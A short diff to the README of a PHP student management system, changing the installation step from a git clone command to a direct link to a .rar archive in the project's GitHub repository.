@@ -25,5 +25,5 @@ The Student Management System (SMS) is a web-based application developed using P
 1. **Clone the Repository**
 
    ```bash
-   git clone https://github.com/SABATO123/assigment-crud
+   https://github.com/SABATO123/assigment-crud/blob/main/assignment%20crud.rar
   
